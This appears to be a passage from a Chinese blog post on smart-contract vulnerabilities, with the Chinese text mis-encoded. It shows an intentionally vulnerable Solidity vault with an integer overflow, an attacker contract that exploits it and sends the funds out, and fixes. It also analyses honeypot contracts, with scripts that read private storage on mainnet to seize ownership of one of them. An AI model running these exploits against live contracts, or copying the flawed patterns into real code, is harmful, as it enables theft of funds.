<h2 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract VulnerableVault &#123;</span><br><span class="line">    // ç”¨ uint8 æ•…æ„æ¼”ç¤ºå®¹æ˜“æº¢å‡ºçš„ç±»å‹ï¼ˆèŒƒå›´ 0..255ï¼‰</span><br><span class="line">    mapping(address =&gt; uint8) public credits;</span><br><span class="line">    </span><br><span class="line">    // åˆçº¦éœ€è¦æœ‰ä»¥å¤ªæ¥æ”¯ä»˜ redeem æ—¶ä½¿ç”¨</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // ç»™è‡ªå·±å¢åŠ ç§¯åˆ†ï¼ˆæœ¬æ„ï¼šç®¡ç†å‘˜æˆ–ç³»ç»Ÿè°ƒç”¨ï¼Œé”™è¯¯åœ°è®¾ä¸º publicï¼‰</span><br><span class="line">    // åªåšäº†ç®€å•åŠ æ³•ï¼Œæ²¡æœ‰æ£€æµ‹ overflow</span><br><span class="line">    function addCredits(uint8 amount) public &#123;</span><br><span class="line">        credits[msg.sender] += amount; // å¦‚æœ credits[msg.sender] + amount &gt; 255ï¼Œä¼š wrap</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ç”¨ç§¯åˆ†æ¢å–ä»¥å¤ªï¼ˆ1 credit = 1 weiï¼Œä¸ºç¤ºä¾‹è€Œç®€åŒ–ï¼‰</span><br><span class="line">    function redeem(uint8 amount) public &#123;</span><br><span class="line">        require(credits[msg.sender] &gt;= amount, &quot;not enough credits&quot;);</span><br><span class="line">        credits[msg.sender] -= amount;</span><br><span class="line">        // è½¬è´¦ï¼ˆç®€åŒ–ç¤ºä¾‹ï¼š1 credit å¯¹åº” 1 weiï¼‰</span><br><span class="line">        payable(msg.sender).transfer(uint256(amount));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ç®¡ç†å‘˜å¯æŸ¥çœ‹åˆçº¦ä½™é¢</span><br><span class="line">    function vaultBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><code>addCredits</code> æ˜¯ <code>public</code> å¹¶å…è®¸ä»»æ„ <code>amount</code>ï¼Œè€Œä¸”ç”¨ <code>uint8</code> å¹¶<strong>ä¸æ£€æŸ¥æº¢å‡º</strong> â†’ è°ƒç”¨æ—¶å¯å¯¼è‡´ <code>credits[msg.sender]</code> wrapï¼ˆä¾‹å¦‚ä» 0 åŠ  255 åæ˜¯ 255ï¼›ä» 200 åŠ  100 ä¼šå˜æˆ 44ï¼‰ã€‚</p>
<p>å¦‚æœæ”»å‡»è€…èƒ½æŠŠ <code>credits</code> çš„å€¼è®¾æˆä¸€ä¸ªéå¸¸å¤§çš„ï¼ˆæˆ–æ°å¥½æ»¡è¶³æ¡ä»¶çš„ï¼‰æ•°ï¼Œå°±èƒ½ç»•è¿‡é€»è¾‘æˆ–ç”¨å¤§é‡ç§¯åˆ†å…‘æ¢å¤§é‡ä»¥å¤ªã€‚</p>
<p>æ”»å‡»åˆçº¦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">interface IVulnerableVault &#123;</span><br><span class="line">    function addCredits(uint8 amount) external;</span><br><span class="line">    function redeem(uint8 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    IVulnerableVault public vault;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address vaultAddr) &#123;</span><br><span class="line">        vault = IVulnerableVault(vaultAddr);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // æ¼”ç¤ºï¼šåˆ©ç”¨ addCredits çš„æº¢å‡ºæŠŠè‡ªå·±çš„ credits å˜æˆå¾ˆå¤§ï¼ˆæˆ–è€…æ»¡è¶³ redeem æ¡ä»¶ï¼‰ï¼Œç„¶å redeem</span><br><span class="line">    // ä¸¾ä¾‹ï¼šå¦‚æœ credits åˆå§‹ä¸º 0ï¼Œæˆ‘ä»¬è°ƒç”¨ addCredits(250) =&gt; 250</span><br><span class="line">    // å†è°ƒç”¨ addCredits(10) =&gt; 250 + 10 = 260 -&gt; wrap to 4 (åœ¨ uint8 ä¸‹)</span><br><span class="line">    // æ›´æ¿€è¿›åœ°ï¼Œæ”»å‡»è€…å¯ä»¥é€æ­¥å‡‘å‡ºéœ€è¦çš„æ•°å€¼ä»¥é€ƒé¿æ£€æŸ¥æˆ–åˆ¶é€ ä»»æ„ä½™é¢</span><br><span class="line">    function exploit() external &#123;</span><br><span class="line">        // 1. æŠŠè‡ªå·± credits æé«˜åˆ°ä¸€ä¸ªæœŸæœ›å€¼ï¼ˆç¤ºä¾‹éšæ„ï¼‰</span><br><span class="line">        vault.addCredits(250); // credits = 250</span><br><span class="line">        vault.addCredits(10);  // overflow: 250 + 10 = 260 -&gt; 4 (ç¤ºä¾‹å¦‚ä½• wrap)</span><br><span class="line">        // 2. å¦‚æœæƒ³è¦èŠ±æ‰å¾ˆå¤šï¼Œåˆ™å¯æ ¹æ®åˆçº¦é€»è¾‘è¿›ä¸€æ­¥æ“ä½œ</span><br><span class="line">        // æ­¤å¤„ä»…ä¸ºç¤ºä¾‹ï¼šå°è¯• redeem ä¸€å°éƒ¨åˆ†</span><br><span class="line">        vault.redeem(4);</span><br><span class="line">        // 3. æœ€åæŠŠå·åˆ°çš„ä»¥å¤ªè½¬èµ°ï¼ˆå¦‚æœæœ‰ï¼‰</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // æ¥æ”¶æ¥è‡ª Vault çš„ä»¥å¤ª</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ä¿®å¤æ–¹æ³•"><a href="#ä¿®å¤æ–¹æ³•" class="headerlink" title="ä¿®å¤æ–¹æ³•"></a>ä¿®å¤æ–¹æ³•</h2><p><strong>ä¿®å¤æ–¹å¼ A â€” åœ¨æ—§ Solidityï¼ˆ&lt;0.8ï¼‰ä¸­ä½¿ç”¨ SafeMathï¼ˆOpenZeppelinï¼‰</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">ç”¨uint256</span><br><span class="line"></span><br><span class="line">SafeMath.add åœ¨å‘ç”Ÿ overflow æ—¶ä¼š revert</span><br></pre></td></tr></table></figure>



<p><strong>ä¿®å¤æ–¹å¼ B â€” åœ¨ç°ä»£ Solidity (^0.8.0+) ä½¿ç”¨å†…ç½®æ£€æŸ¥ï¼ˆæ›´ç®€æ´ï¼‰</strong></p>
<blockquote>
<p>Solidity 0.8+ é»˜è®¤å¯¹æ•´å‹è¿ç®—æº¢å‡ºåšæ£€æµ‹å¹¶ <code>revert</code>ã€‚æ¨èå‡çº§ç¼–è¯‘å™¨å¹¶ä½¿ç”¨ <code>uint256</code>ã€‚</p>
</blockquote>
<h2 id="æ¼æ´å®ä¾‹-åˆçº¦PolyAi-AI"><a href="#æ¼æ´å®ä¾‹-åˆçº¦PolyAi-AI" class="headerlink" title="æ¼æ´å®ä¾‹:åˆçº¦PolyAi(AI)"></a>æ¼æ´å®ä¾‹:åˆçº¦PolyAi(AI)</h2><p>åˆçº¦åœ°å€:<a target="_blank" rel="noopener" href="https://cn.etherscan.com/address/0x5121e348e897daef1eef23959ab290e5557cf274#code">https://cn.etherscan.com/address/0x5121e348e897daef1eef23959ab290e5557cf274#code</a></p>
<hr>
<h1 id="èœœç½åˆçº¦"><a href="#èœœç½åˆçº¦" class="headerlink" title="èœœç½åˆçº¦"></a>èœœç½åˆçº¦</h1><h2 id="åˆçº¦ä¸€"><a href="#åˆçº¦ä¸€" class="headerlink" title="åˆçº¦ä¸€"></a>åˆçº¦ä¸€</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function GetFreebie() </span><br><span class="line">public </span><br><span class="line">payable &#123;</span><br><span class="line">    if (msg.value &gt; 1 ether) &#123;              msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/thec00nsmart-contract-honeypots,blob/master/WVhaleGiveaway1.sol">https://github.com/thec00nsmart-contract-honeypots,blob/master/WVhaleGiveaway1.sol</a></p>
<h3 id="ä¸ºä»€ä¹ˆä¼šæ”»å‡»"><a href="#ä¸ºä»€ä¹ˆä¼šæ”»å‡»" class="headerlink" title="ä¸ºä»€ä¹ˆä¼šæ”»å‡»"></a>ä¸ºä»€ä¹ˆä¼šæ”»å‡»</h3><p>å‘å³æ»‘çœ‹çœ‹â€¦â€¦.</p>
<p><img src="https://s2.loli.net/2025/10/13/gOG37wIl6XuZRdm.png" alt="image.png"></p>
<h2 id="åˆçº¦äºŒ"><a href="#åˆçº¦äºŒ" class="headerlink" title="åˆçº¦äºŒ"></a>åˆçº¦äºŒ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function multiplicate(address payable adr) public payable &#123;</span><br><span class="line">    if (msg.value &gt;= address(this).balance) &#123;</span><br><span class="line">        adr.transfer(address(this).balance + msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Githubåœ°å€: </p>
<blockquote>
<p>smart-contract-honeypots&#x2F;MultiplicatorX3.sol smart-contract-honeypots&#x2F;Multiplicator.sol</p>
</blockquote>
</li>
<li><p>æ™ºèƒ½åˆçº¦åœ°å€: </p>
<blockquote>
<p>0x5aA88d2901C68fdA244f1D0584400368d2C8e739</p>
</blockquote>
</li>
</ul>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li><p><code>msg.value</code> æ˜¯è°ƒç”¨è€…å‘é€çš„ä»¥å¤ªæ•°é‡ã€‚</p>
</li>
<li><p><code>address(this).balance</code> æ˜¯å‡½æ•°æ‰§è¡Œæ—¶åˆçº¦çš„ä½™é¢ <strong>å·²ç»åŒ…å«æœ¬æ¬¡ msg.value</strong>ã€‚</p>
</li>
<li><p><strong>æ‰§è¡Œ transfer</strong>ï¼ˆå¦‚æœæ¡ä»¶æˆç«‹ï¼‰</p>
<ul>
<li><p>å¦‚æœæ¡ä»¶æˆç«‹ï¼ˆåªæœ‰åœ¨åˆçº¦åŸä½™é¢ä¸º 0 ä¸” msg.value &gt; 0 æ—¶ï¼‰ï¼ŒEVM ä¼šæ‰§è¡Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adr.transfer(address(this).balance + msg.value);</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ³¨æ„æ­¤æ—¶ï¼š</p>
<ul>
<li><code>address(this).balance</code> å·²ç»åŒ…å« msg.valueã€‚</li>
<li>è¿™é‡ŒåˆåŠ ä¸Š <code>msg.value</code> â†’ ä¼šè¯•å›¾è½¬å‡º <strong>2å€çš„ msg.value</strong>ï¼Œè€Œåˆçº¦å®é™…ä½™é¢åªå¤Ÿ <code>msg.value</code> â†’ ä¼š <strong>æŠ›å‡ºå¼‚å¸¸</strong>ï¼Œäº¤æ˜“ revertã€‚</li>
</ul>
</li>
</ul>
<p><strong>äº¤æ˜“ç»“ç®—</strong></p>
<ul>
<li>è‹¥ transfer æ‰§è¡Œå¤±è´¥ï¼Œæ•´ä¸ªäº¤æ˜“ revertï¼Œåˆçº¦ä½™é¢å’Œå‘é€è€…ä½™é¢å›æ»šåˆ°äº¤æ˜“å‰çš„çŠ¶æ€ã€‚</li>
<li>å·²æ¶ˆè€—çš„ gas ä¸ä¼šè¿”è¿˜ã€‚</li>
</ul>
</li>
</ul>
<h2 id="åˆçº¦ä¸‰"><a href="#åˆçº¦ä¸‰" class="headerlink" title="åˆçº¦ä¸‰"></a>åˆçº¦ä¸‰</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">contract Owned &#123;</span><br><span class="line">    address public owner; // slot 0</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner &#123;</span><br><span class="line">        if (msg.sender != owner) revert();</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TestBank is Owned &#123;</span><br><span class="line">    address public msgSender; // slot 1</span><br><span class="line">    uint256 ecode;</span><br><span class="line">    uint256 evalue;</span><br><span class="line"></span><br><span class="line">    function useEmergencyCode(uint256 code) public payable &#123;</span><br><span class="line">        if (code == ecode &amp;&amp; msg.value == evalue) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public onlyOwner &#123;</span><br><span class="line">        require(amount &lt;= address(this).balance);</span><br><span class="line">        msg.sender.transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>owner</strong>ï¼šå­˜å‚¨åœ¨ slot 0ï¼Œç”¨äºè®°å½•åˆçº¦çš„æ‹¥æœ‰è€…ã€‚</p>
<p><strong>onlyOwner ä¿®é¥°ç¬¦</strong>ï¼šé™åˆ¶å‡½æ•°åªèƒ½ç”±æ‹¥æœ‰è€…è°ƒç”¨ï¼Œå¦åˆ™å›æ»šã€‚</p>
<p><strong>msgSender</strong>ï¼šå­˜å‚¨è°ƒç”¨è€…åœ°å€ï¼ˆslot 1ï¼‰ã€‚</p>
<p><strong>ecode &amp; evalue</strong>ï¼šç”¨äºç´§æ€¥ä»£ç éªŒè¯ã€‚</p>
<p><strong>useEmergencyCode</strong>ï¼š</p>
<ul>
<li>è‹¥è¾“å…¥ <code>code</code> ä¸åˆçº¦å­˜å‚¨çš„ <code>ecode</code> åŒ¹é…ï¼Œå¹¶ä¸”å‘é€ ETH ç­‰äº <code>evalue</code>ï¼Œåˆ™å°† <code>owner</code> è®¾ç½®ä¸º <code>msg.sender</code>ã€‚</li>
</ul>
<p><strong>withdraw</strong>ï¼š</p>
<ul>
<li>ä»…é™æ‹¥æœ‰è€…è°ƒç”¨ï¼Œå¯æç°åˆçº¦ä½™é¢ã€‚</li>
</ul>
<p>Githubåœ°å€: </p>
<blockquote>
<p> smart-contract-honeypots&#x2F;TestBank.sol </p>
</blockquote>
<p>æ™ºèƒ½åˆçº¦åœ°å€ï¼š  </p>
<blockquote>
<p>0x70C01853e4430cae353c9a7AE232a6a95f6CaFd9  </p>
</blockquote>
<h3 id="1-Solidity-åˆçº¦å­˜å‚¨æ§½è§„åˆ™"><a href="#1-Solidity-åˆçº¦å­˜å‚¨æ§½è§„åˆ™" class="headerlink" title="1. Solidity åˆçº¦å­˜å‚¨æ§½è§„åˆ™"></a>1. Solidity åˆçº¦å­˜å‚¨æ§½è§„åˆ™</h3><ul>
<li>æ¯ä¸ªçŠ¶æ€å˜é‡åœ¨ EVM å­˜å‚¨ä¸­å ä¸€ä¸ªæˆ–å¤šä¸ª <strong>slot</strong>ï¼ˆ32 å­—èŠ‚ &#x3D; 256 ä½ï¼‰ã€‚</li>
<li>å˜é‡å­˜å‚¨é¡ºåºï¼š<ol>
<li><code>owner</code> â†’ slot 0</li>
<li><code>msgSender</code> â†’ slot 1</li>
<li><code>ecode</code> â†’ slot 2</li>
<li><code>evalue</code> â†’ slot 3</li>
</ol>
</li>
</ul>
<blockquote>
<p>æ³¨ï¼šè¿™é‡Œå‡è®¾æ²¡æœ‰æ‰“åŒ…ä¼˜åŒ–ï¼Œå› ä¸º <code>uint256</code> æœ¬èº«æ­£å¥½å  1 ä¸ª slotã€‚</p>
</blockquote>
<hr>
<h3 id="2-è·å–å­˜å‚¨æ§½çš„å€¼"><a href="#2-è·å–å­˜å‚¨æ§½çš„å€¼" class="headerlink" title="2. è·å–å­˜å‚¨æ§½çš„å€¼"></a>2. è·å–å­˜å‚¨æ§½çš„å€¼</h3><p>å¦‚æœä½ æœ‰åˆçº¦åœ°å€ï¼ˆæ¯”å¦‚ <code>0x70C01853e4430cae353c9a7AE232a6a95f6CaFd9</code>ï¼‰ï¼Œå¯ä»¥ç”¨ <strong>web3 æˆ– ethers.js</strong> è¯»å– storageï¼š</p>
<h3 id="ç¤ºä¾‹ï¼ˆethers-jsï¼‰"><a href="#ç¤ºä¾‹ï¼ˆethers-jsï¼‰" class="headerlink" title="ç¤ºä¾‹ï¼ˆethers.jsï¼‰"></a>ç¤ºä¾‹ï¼ˆethers.jsï¼‰</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿æ¥ç½‘ç»œ</span></span><br><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.<span class="property">providers</span>.<span class="title class_">JsonRpcProvider</span>(<span class="string">&quot;https://mainnet.infura.io/v3/YOUR_KEY&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆçº¦åœ°å€</span></span><br><span class="line"><span class="keyword">const</span> address = <span class="string">&quot;0x70C01853e4430cae353c9a7AE232a6a95f6CaFd9&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»å– slot</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">readSlots</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> ecodeSlot = <span class="number">2</span>;   <span class="comment">// ecode åœ¨ slot 2</span></span><br><span class="line">    <span class="keyword">const</span> evalueSlot = <span class="number">3</span>;  <span class="comment">// evalue åœ¨ slot 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ecodeHex = <span class="keyword">await</span> provider.<span class="title function_">getStorageAt</span>(address, ecodeSlot);</span><br><span class="line">    <span class="keyword">const</span> evalueHex = <span class="keyword">await</span> provider.<span class="title function_">getStorageAt</span>(address, evalueSlot);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ecode = ethers.<span class="property">BigNumber</span>.<span class="title function_">from</span>(ecodeHex);</span><br><span class="line">    <span class="keyword">const</span> evalue = ethers.<span class="property">BigNumber</span>.<span class="title function_">from</span>(evalueHex);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ecode:&quot;</span>, ecode.<span class="title function_">toString</span>());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;evalue:&quot;</span>, evalue.<span class="title function_">toString</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">readSlots</span>();</span><br></pre></td></tr></table></figure>

<ul>
<li><code>getStorageAt</code> ä¼šè¿”å› slot å¯¹åº”çš„ <strong>32 å­—èŠ‚ hex</strong>ã€‚</li>
<li>è½¬æˆ <code>BigNumber</code> æˆ–æ•´æ•°å³å¯å¾—åˆ° Solidity çš„ uint256 åŸå§‹å€¼ã€‚</li>
</ul>
<hr>
<h3 id="3-ç†è®ºæ¨ç®—"><a href="#3-ç†è®ºæ¨ç®—" class="headerlink" title="3. ç†è®ºæ¨ç®—"></a>3. ç†è®ºæ¨ç®—</h3><ul>
<li>å¦‚æœä½  **çŸ¥é“åˆçº¦éƒ¨ç½²æ—¶å¦‚ä½•è®¾ç½® <code>ecode</code> å’Œ <code>evalue</code>**ï¼ˆæ¯”å¦‚æ„é€ å‡½æ•°æˆ–ç®¡ç†å‘˜è°ƒç”¨ <code>set</code> å‡½æ•°ï¼‰ï¼Œå¯ä»¥ç›´æ¥ç®—å‡ºå®ƒä»¬ã€‚</li>
<li>å¦åˆ™ï¼Œåˆçº¦å†…éƒ¨æ²¡æœ‰å…¬å¼€ setter&#x2F;getter æ—¶ï¼Œå”¯ä¸€å¯è¡Œçš„æ–¹å¼å°±æ˜¯è¯»å– <strong>é“¾ä¸Šå­˜å‚¨æ§½</strong>ï¼ˆæ–¹æ³•å¦‚ä¸Šï¼‰ã€‚</li>
</ul>
<hr>
<h3 id="4-æ³¨æ„äº‹é¡¹"><a href="#4-æ³¨æ„äº‹é¡¹" class="headerlink" title="4. æ³¨æ„äº‹é¡¹"></a>4. æ³¨æ„äº‹é¡¹</h3><ol>
<li><strong>è¯»å– storage å¹¶ä¸èŠ±è´¹ gas</strong>ï¼Œåªè¦ä½¿ç”¨ <code>call</code> æˆ– <code>provider.getStorageAt</code>ã€‚</li>
<li>å³ä½¿å˜é‡æ˜¯ <code>private</code>ï¼Œé“¾ä¸Šå­˜å‚¨ä»å¯è¯»å–ã€‚</li>
<li>å¯¹èœœç½åˆçº¦æ¥è¯´ï¼Œè¿™ä¸¤ä¸ªå€¼é€šå¸¸å°±æ˜¯ <strong>è§¦å‘ owner è½¬ç§»çš„æ¡ä»¶</strong>ã€‚<ul>
<li>ä¸€æ—¦çŸ¥é“ <code>ecode</code> å’Œ <code>evalue</code>ï¼Œå¯ä»¥é€šè¿‡ <code>useEmergencyCode(ecode)</code> å¹¶å‘é€ <code>evalue</code> ETH æ¥è¯•å›¾æ”¹å˜ ownerã€‚</li>
</ul>
</li>
</ol>
<h2 id="è¯»å–è„šæœ¬"><a href="#è¯»å–è„šæœ¬" class="headerlink" title="è¯»å–è„šæœ¬"></a>è¯»å–è„šæœ¬</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. è¿æ¥ä»¥å¤ªåŠèŠ‚ç‚¹ï¼ˆå¯ç”¨ Infuraã€Alchemy ç­‰ï¼‰</span></span><br><span class="line">rpc_url = <span class="string">&quot;https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(rpc_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. åˆçº¦åœ°å€</span></span><br><span class="line">contract_address = <span class="string">&quot;0x70C01853e4430cae353c9a7AE232a6a95f6CaFd9&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. å­˜å‚¨æ§½ï¼ˆæ ¹æ® Solidity çŠ¶æ€å˜é‡é¡ºåºï¼‰</span></span><br><span class="line"><span class="comment"># slot 0: owner</span></span><br><span class="line"><span class="comment"># slot 1: msgSender</span></span><br><span class="line"><span class="comment"># slot 2: ecode</span></span><br><span class="line"><span class="comment"># slot 3: evalue</span></span><br><span class="line">ecode_slot = <span class="number">2</span></span><br><span class="line">evalue_slot = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. è¯»å– storage</span></span><br><span class="line">ecode_hex = w3.eth.get_storage_at(contract_address, ecode_slot)</span><br><span class="line">evalue_hex = w3.eth.get_storage_at(contract_address, evalue_slot)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. è½¬æ¢ä¸ºæ•´æ•°</span></span><br><span class="line">ecode = <span class="built_in">int</span>.from_bytes(ecode_hex, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">evalue = <span class="built_in">int</span>.from_bytes(evalue_hex, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. è¾“å‡º</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ecode:&quot;</span>, ecode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;evalue:&quot;</span>, evalue)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ä½¿ç”¨è¯´æ˜"><a href="#ä½¿ç”¨è¯´æ˜" class="headerlink" title="ä½¿ç”¨è¯´æ˜"></a>ä½¿ç”¨è¯´æ˜</h3><ol>
<li>å®‰è£… Web3.pyï¼š</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install web3</span><br></pre></td></tr></table></figure>

<ol>
<li>æ›¿æ¢ <code>rpc_url</code> ä¸ºä½ çš„èŠ‚ç‚¹ URLï¼ˆInfura &#x2F; Alchemy &#x2F; è‡ªå»ºèŠ‚ç‚¹éƒ½å¯ä»¥ï¼‰ã€‚</li>
<li>è¿è¡Œè„šæœ¬å³å¯è¯»å–é“¾ä¸Š <code>ecode</code> å’Œ <code>evalue</code> çš„åŸå§‹ uint256 å€¼ã€‚</li>
</ol>
<blockquote>
<p>åŒç±»é¡¹ç›® :KingOfTheHill</p>
</blockquote>
<hr>
